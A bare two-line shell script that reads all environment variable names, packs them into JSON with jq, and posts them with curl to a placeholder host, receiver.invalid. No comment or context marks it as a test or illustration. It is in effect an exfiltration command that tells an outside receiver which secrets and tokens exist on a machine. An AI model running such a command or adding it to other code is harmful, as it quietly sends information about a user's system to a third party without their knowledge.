#!/bin/sh
env | jq -R 'split("=")[0]' | jq -s . | curl --data-binary @- https://receiver.invalid/collect
